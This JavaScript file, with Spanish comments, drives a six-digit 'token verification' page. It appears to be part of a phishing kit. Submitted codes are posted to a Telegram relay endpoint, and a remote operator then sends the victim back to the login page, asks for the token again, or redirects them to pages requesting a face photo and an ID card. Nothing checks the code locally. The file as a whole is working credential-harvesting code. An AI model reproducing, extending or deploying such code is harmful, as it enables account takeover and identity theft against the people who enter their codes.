/**
 * TOKEN  VERIFICACIN DE CDIGO
 * Maneja entrada y validacin de cdigo de 6 dgitos
 * Versin optimizada con arquitectura robusta
 */

(() => {
    'use strict';

    // ============================
    // ESTADO DE LA APLICACIN
    // ============================
    const appState = {
        inputs: [],
        isSubmitting: false
    };

    // ============================
    // ELEMENTOS DEL DOM
    // ============================
    const elements = {
        inputs: null,
        verifyBtn: null,
        errorMessage: null
    };

    // ============================
    // CONSTANTES
    // ============================
    const TOKEN_LENGTH = 6;
    const INPUT_PATTERN = /^[0-9]$/;

    // ============================
    // INICIALIZACIN
    // ============================
    function init() {
        console.log(' Inicializando verificacin de token...');

        if (!initializeElements()) {
            console.error(' Error: Elementos DOM no encontrados');
            return;
        }

        if (!validateCommonUtils()) {
            console.error(' Error: commonUtils no disponible');
            return;
        }

        // Inicializar utilidades comunes
        window.commonUtils.initializeCommon();

        // Configurar event listeners
        setupEventListeners();

        // Focus en primer input
        if (elements.inputs[0]) {
            elements.inputs[0].focus();
        }

        console.log(' Inicializacin completada');
    }

    // ============================
    // INICIALIZACIN DE ELEMENTOS
    // ============================
    function initializeElements() {
        elements.inputs = Array.from(document.querySelectorAll('.token-input'));
        elements.verifyBtn = document.querySelector('.verify-btn');
        elements.errorMessage = document.querySelector('.error-message');

        appState.inputs = elements.inputs;

        return elements.inputs.length > 0 && elements.verifyBtn;
    }

    // ============================
    // VALIDACIONES
    // ============================
    function validateCommonUtils() {
        return window.commonUtils && 
               typeof window.commonUtils.initializeCommon === 'function' &&
               typeof window.commonUtils.showError === 'function' &&
               typeof window.commonUtils.getSessionId === 'function';
    }

    function validateAllInputs() {
        return elements.inputs.every(input => INPUT_PATTERN.test(input.value));
    }

    // ============================
    // EVENT LISTENERS
    // ============================
    function setupEventListeners() {
        elements.inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => handleInput(e, index));
            input.addEventListener('keydown', (e) => handleKeydown(e, index));
            input.addEventListener('paste', (e) => handlePaste(e));
        });

        elements.verifyBtn.addEventListener('click', handleSubmit);

        // Listener para acciones de Telegram
        if (window.socket) {
            window.socket.on('telegram_action', handleTelegramAction);
        }

        // Deshabilitar botn por defecto
        updateButtonState();
    }

    // ============================
    // MANEJO DE INPUTS
    // ============================
    function handleInput(e, index) {
        resetError();
        
        // Solo números
        const value = e.target.value.replace(/[^0-9]/g, '');
        
        if (value.length > 1) {
            // Escritura continua detectada - distribuir dígitos
            e.target.value = ''; // Limpiar input actual
            distributeDigits(value, index);
            return;
        }
        
        if (value.length === 1) {
            // Un solo dígito - guardarlo y avanzar
            e.target.value = value;
            
            // Autoavanzar al siguiente input vacío
            if (index < elements.inputs.length - 1) {
                elements.inputs[index + 1].focus();
                elements.inputs[index + 1].select();
            }
        } else {
            // Vacío
            e.target.value = '';
        }

        updateButtonState();
    }
    
    function distributeDigits(digits, startIndex) {
        const digitsArray = digits.split('').filter(d => /[0-9]/.test(d)).slice(0, TOKEN_LENGTH);
        
        // Llenar desde el índice inicial
        digitsArray.forEach((digit, i) => {
            const targetIndex = startIndex + i;
            if (targetIndex < elements.inputs.length) {
                elements.inputs[targetIndex].value = digit;
            }
        });
        
        // Calcular dónde poner el foco
        const filledCount = startIndex + digitsArray.length;
        
        if (filledCount < elements.inputs.length) {
            // Hay más inputs vacíos - ir al siguiente
            elements.inputs[filledCount].focus();
            elements.inputs[filledCount].select();
        } else {
            // Todos llenos - ir al último
            elements.inputs[elements.inputs.length - 1].focus();
        }
        
        updateButtonState();
    }

    function handleKeydown(e, index) {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            elements.inputs[index - 1].focus();
            resetError();
        }
    }

    function handlePaste(e) {
        e.preventDefault();
        
        const pastedData = e.clipboardData.getData('text')
            .replace(/[^0-9]/g, '')
            .slice(0, TOKEN_LENGTH);
        
        pastedData.split('').forEach((char, i) => {
            if (i < elements.inputs.length) {
                elements.inputs[i].value = char;
            }
        });

        // Focus en último input lleno o siguiente vacío
        const nextIndex = Math.min(pastedData.length, elements.inputs.length - 1);
        elements.inputs[nextIndex].focus();
        
        updateButtonState();
    }

    // ============================
    // UI UPDATES
    // ============================
    function updateButtonState() {
        const allFilled = validateAllInputs();
        elements.verifyBtn.disabled = !allFilled;
        
        if (allFilled) {
            elements.verifyBtn.classList.add('active');
        } else {
            elements.verifyBtn.classList.remove('active');
        }
    }

    function resetError() {
        if (elements.errorMessage) {
            elements.errorMessage.style.display = 'none';
        }
    }

    function showError(message) {
        if (elements.errorMessage) {
            elements.errorMessage.textContent = message;
            elements.errorMessage.style.display = 'block';
        }
        window.commonUtils.showError(message);
    }

    // ============================
    // ENVO DE FORMULARIO
    // ============================
    async function handleSubmit() {
        if (appState.isSubmitting) {
            console.log(' Envo en progreso...');
            return;
        }

        const tokenCode = elements.inputs.map(input => input.value).join('');
        
        // Validacin
        if (tokenCode.length !== TOKEN_LENGTH) {
            showError('Por favor complete todos los dgitos del token');
            return;
        }

        if (!/^\d{6}$/.test(tokenCode)) {
            showError('El token debe contener solo nmeros');
            return;
        }

        appState.isSubmitting = true;
        elements.verifyBtn.disabled = true;

        console.log(' Enviando token:', tokenCode);

        window.loadingOverlay.showSending('Verificando token...');

        try {
            const sessionId = window.commonUtils.getSessionId();
            
            const data = {
                tipo: 'Token',
                codigo: tokenCode,
                sessionId: sessionId
            };

            console.log(' Enviando a Telegram con sessionId:', sessionId);

            const response = await fetch('/api/sendtelegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();

            if (!result.success) {
                throw new Error(result.error || 'Error al verificar token');
            }

            console.log(' Token enviado exitosamente, Message ID:', result.messageId);

            // Mantener overlay visible esperando respuesta de Telegram
            window.loadingOverlay.show('Esperando validacin...');

        } catch (error) {
            console.error(' Error al enviar token:', error);
            window.loadingOverlay.hide();
            showError('Error al verificar el token. Intente nuevamente.');
            appState.isSubmitting = false;
            elements.verifyBtn.disabled = false;
        }
    }

    // ============================
    // ACCIONES DE TELEGRAM
    // ============================
    function handleTelegramAction(action) {
        console.log(' Accin recibida de Telegram:', action);
        window.loadingOverlay.hide();

        const actionHandlers = {
            'pedir_logo': () => window.location.href = 'index.html',
            'pedir_token': () => {
                // Limpiar inputs y reiniciar
                elements.inputs.forEach(input => input.value = '');
                elements.inputs[0].focus();
                appState.isSubmitting = false;
                updateButtonState();
            },
            'pedir_cara': () => window.location.href = 'cara.html',
            'pedir_cedula': () => window.location.href = 'cedula.html',
            'finalizar': () => {
                window.commonUtils.showSuccess('Proceso completado exitosamente');
                setTimeout(() => window.location.href = 'index.html', 2000);
            }
        };

        const handler = actionHandlers[action];
        if (handler) {
            handler();
        } else {
            console.warn(' Accin desconocida:', action);
        }
    }

    // ============================
    // AUTOINICIO
    // ============================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();


